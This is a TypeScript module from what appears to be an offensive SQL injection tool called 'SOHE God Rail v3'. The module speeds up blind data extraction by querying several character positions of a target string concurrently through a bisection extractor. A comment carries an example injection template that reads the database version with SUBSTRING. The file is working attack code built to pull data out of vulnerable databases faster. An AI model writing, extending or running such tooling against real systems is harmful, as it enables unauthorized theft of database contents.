/**
 * SOHE God Rail v3 — Parallel Extractor
 *
 * Drastically speeds up blind extraction by extracting multiple character
 * positions simultaneously using concurrent threads/requests.
 */

import { BisectionExtractor } from './BisectionExtractor';
import { StrategyContext } from './StrategyPlanner';

export class ParallelExtractor {
    private bisector: BisectionExtractor;

    constructor(bisector: BisectionExtractor) {
        this.bisector = bisector;
    }

    /**
     * Extracts a string of known length by querying multiple positions concurrently.
     * @param length The known length of the string to extract
     * @param concurrency How many positions to extract at once
     */
    async extractStringParallel(
        ctx: StrategyContext,
        queryTemplate: (pos: number) => string, // e.g. (pos) => `SUBSTRING(@@version, ${pos}, 1)`
        booleanConditionTemplate: string,
        length: number,
        concurrency: number = 5,
        onProgress?: (currentString: string) => void
    ): Promise<string> {
        
        const result: string[] = new Array(length).fill('?');
        const positions = Array.from({ length }, (_, i) => i + 1); // 1-indexed for SQL

        // Process in batches
        for (let i = 0; i < positions.length; i += concurrency) {
            const batch = positions.slice(i, i + concurrency);
            
            // Map each position in the batch to a Bisection extraction Promise
            const promises = batch.map(async (pos) => {
                const extractionQuery = queryTemplate(pos);
                const char = await this.bisector.extractChar(ctx, extractionQuery, booleanConditionTemplate);
                return { pos, char };
            });

            // Wait for this batch to complete concurrently
            const batchResults = await Promise.all(promises);

            // Update result array
            for (const { pos, char } of batchResults) {
                result[pos - 1] = char;
            }

            if (onProgress) {
                onProgress(result.join(''));
            }
        }

        return result.join('');
    }
}
